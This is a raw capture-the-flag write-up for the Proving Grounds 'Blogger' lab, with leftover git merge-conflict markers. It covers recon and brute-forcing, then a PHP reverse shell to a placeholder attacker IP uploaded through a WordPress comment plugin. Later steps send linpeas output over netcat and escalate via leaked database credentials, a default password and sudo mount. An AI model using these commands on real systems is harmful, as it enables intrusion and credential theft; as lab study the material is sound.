# Blogger [Proving Grounds Play]

<<<<<<< HEAD
<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **Assisted by [write-up link]** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 
=======
<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 
>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7

## _Manual Exploitation_

First step would be defining the target machine's IP inside a variable named `targ3t`:

```
targ3t=192.168.194.217
```

And checking that it works:

```
echo $targ3t
```

Now let's run an `nmap` scan on this target and see where we land:

```
nmap -A $targ3t -oN nmap.a.scan -vv
```

So we basically have an Apache web server at port `80` and an SSH at port `22`. First, I'll explore the website and navigate to:

```
firefox http://$targ3t
```

First look tells us it's a landing page for some programmer named James, it has seemingly non-functional login, registration and contact forms along with some information about the programmer in question. I am going to push this website through `gobuster` and see what comes out:

```
gobuster dir -u $targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A number of links has been returned, specifically with a status code `301` there's first four: `/images/`, `/assets`, `/css`, `/js`. So far all of them seem to be files for the website's content. 

While we're waiting for `gobuster`, I believe we can check exploit database for the Apache web server version this website is running on:

```
searchsploit Apache 2.4.18
```

One of the exploits that popped up, matches the version number. It is a privilege escalation exploit, however:

```
cp /usr/share/exploitdb/exploits/linux/local/46676.php exploit.php
head -20 exploit.php
```

This exploit works by uploading it to the server and then navigating to it as a web resource. We haven't gained any foothold yet, so privilege escalation can wait. Once we're in, we can try it.

Now that `gobuster` scan is done with no usable results, I will push this site through `feroxbuster` to hopefully check for something more:

```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

An interesting URL `http://192.168.194.217/assets/fonts/blog/` came up. There are some blog posts on it on web security by a user named `j@m3s`. This makes me wonder if we can hack into this user's SSH under this username and a `rockyou.txt` wordlist:

```
hydra -t 4 -l j@m3s -P /usr/share/wordlists/rockyou.txt $targ3t ssh
```
```
[ERROR] target ssh://192.168.194.217:22/ does not support password authentication (method reply 4).
```

Let's think, where else could this username be used. There is a login form on the website's home page, let's see its POST request:

```
scheme:     http
host:       192.168.194.217
filename:   /
```

<<<<<<< HEAD
I don't think any of this is usable, the login form is indeed non-functional, I think. Now that I look at the blog web page again, I see there is a link to a `Log in` page on the bottom of the site. However it routes to `blogger.pg/assets/fonts/blog/wp-login.php`, which we can't reach. If we insert `$targ3t` instead of the domain `blogger.pg`, we will be able to open this page:
=======
This POST request went through with no payload, so I don't think any of this is usable, the login form is indeed non-functional, I think. Now that I look at the blog web page again, I see there is a link to a `Log in` page on the bottom of the site. However it routes to `blogger.pg/assets/fonts/blog/wp-login.php`, which we can't reach. If we insert `$targ3t` instead of the domain `blogger.pg`, we will be able to open this page:
>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7

```
firefox $targ3t/assets/fonts/blog/wp-login.php
```

When I try to test the login form with test credentials, it seems to revert back to `blogger.pg` domain. I think we can resolve this temporarily with ease:

```
sudo echo -e "$targ3t\tblogger.pg" >> /etc/hosts
```

Now it all works! Let's try to login with test credentials and obtain a raw POST request payload:

```
log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblogger.pg%2Fassets%2Ffonts%2Fblog%2Fwp-admin%2F&testcookie=1
```

Now that we have this, we can craft a brute force command for `hydra` to try and check a possible password for user `j@m3s`.

```
hydra -t 12 -l j@m3s -P /usr/share/wordlists/rockyou.txt $targ3t http-post-form "/assets/fonts/blog/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A2F%2blogger.pg%2Fassets%2Ffonts%2Fblog%2Fwp-admin%2F&testcookie=1:F=ERROR" -V
```

This doesn't seem to be working as there is no password that matches this username from the `rockyou.txt` list. 

<<<<<<< HEAD
_<sub>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sub>_

Let's try to use a `wpscan` as this is a wordpress website to see if there are any interesting plugins we could use:
=======
_<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ Let's try to use a `wpscan` as this is a wordpress website to see if there are any interesting plugins we could use:
>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7

```
wpscan --url http://$targ3t/assets/fonts/blog -t 12 --plugins-detection aggressive -v -o wp.scan
```

In the identified plugins we can see `wpdiscuz`, which has a capability to upload comments and images. I'm wondering if I can upload a php reverse shell as an image and send a request to it:

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'"); __halt_compiler(); ?>
```

I used the above code as a PHP reverse shell and I will try to inject it into a `boat.jpg` I have downloaded the following way:

```
jhead -ce boat.jpg
```

Now I will navigate to one of the blog posts on the blog:

```
firefox https://blogger.pg/assets/fonts/blog/?p=29
```

And try to attach this `boat.jpg` to a comment and post it.
<<<<<<< HEAD
=======

The comment has been made, now I'll listen with `nc` on port `443`:

```
nc -lvnp 443
```

And navigate to this image with a URL it is hosted on. It doesn't seem to work. The listener doesn't do anything. Let's change the extension of the image to `boat.jpg.php` and see if the comment image upload engine will recognize it.

The upload worked, posting comment.

Trying to navigate to this `php` file from browser.

And we have a shell. Get the local flag:

```
cd /home/james
cat local.txt
```

Time for Privilege Escalation now to get the root flag. Let's try the former privilege escalation exploit we found and saved as `exploit.php`. _<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ But first, let's upgrade the shell. 

Let's check if python3 is installed on the machine:

```
python3 -V
```

It appears to be here. Now let's upgrade our shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let's see if there are any SUID binaries for us to exploit:

```
find / -perm /4000 2>/dev/null
```

There is `at`, `pkexec` and `mount`. Let's try each:

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

Apparently this user can't use `at` for some reason.

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
```

And doesn't have sudo permissions, which means `mount` won't work and neither will pkexec.

Now let's use `linpeas` script to find out if this machine has any vulnerabilities to escalate privileges. First let's type the following on the host computer:

```
nc -lvnp 9002 | tee linpeas.out
```

Next, let's type the following in the shell we just upgraded:

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | nc <HOST COMPUTER IP> 9002
```

This will give us `linpeas.out` file full of analysis of the remote machine we just gained a foothold to. I usually like to go through CVEs first:

```
cat linpeas.out | grep CVE
```

There is a `CVE-2016-5195` exploit under the name of `dirtycow`. I've heard of it before, I want to try it first.

```
searchsploit --cve 2016-5195
```

```
cp /usr/share/exploitdb/exploits/linux/local/40839.c dirty.c
```

Now on the remote machine we need to somehow grab this file. Let's start a server on the host machine:

```
python -m http.server
```

Navigate to `/tmp` on the remote machine and type:

```
wget http://<HOST MACHINE IP>:8000/dirty.c
```

The instruction dictates we have to compile this file on the remote machine:

```
gcc -pthread dirty.c -o dirty -lcrypt
```

It appears that gcc isn't available on the remote machine. Let's try compiling it locally and then uploading it to the remote machine.

```
wget http://<HOST MACHINE IP>:8000/dirty
```

It appears some libraries aren't found. This is why we needed it compiled on the remote machine in the first place. Moving on. 

```
searchsploit --cve 2021-3156
```

There is a python exploit we can use. Let's try it:

```
cp /usr/share/exploitdb/exploits/multiple/local/49521.py exploit.py
python -m http.server
```

On the remote machine:

```
wget http://<HOST MACHINE IP>:8000/exploit.py
python3 exploit.py
```

There's some error in the code, which isn't very verbose. I think I'll move on for now. A lot of other options are written in C, which isn't available in our situation. Looking through the `linpeas.out` I notice it found credentials for the `Wordpress` database used on the website:

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
define('DB_HOST', 'localhost');
```

Let's try to use it to log into mysql database:

```
mysql -u root -p wordpress -h localhost
```

Then enter password and we're in:

```
SHOW DATABASES;
USE wordpress;
show tables;
SELECT * FROM wp_users;
```

As we can see there is a password hash for `j@m3s`. Putting that hash through [hashes.com](http://hashes.com), it shows it's a Wordpress MD5. Let's try it with `hashcat` and `rockyou.txt`:

```
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```

_<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ This didn't have any results. Linpeas has also found a user named `vagrant` on the remote machine. After google searching it, it seems to me that vagrant is a tool that helps with creating virtual machines. After watching one of the walkthroughs it became apparent that `vagrant` is a default password for user `vagrant` in most cases. 

```
su vagrant
```

Now that we're this new user we can check SUID binaries for this user:

```
find / -perm /4000 2>/dev/null
```

There are same binaries as before, but this time:

```
sudo -l
```

We have sudo permissions. Let's try `mount`:

```
sudo mount -o bind /bin/sh /bin/mount
sudo mount
```

And we have a root shell. Let's try not to lose it:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let's see the `proof.txt`:

```
cat /root/proof.txt
```
>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7
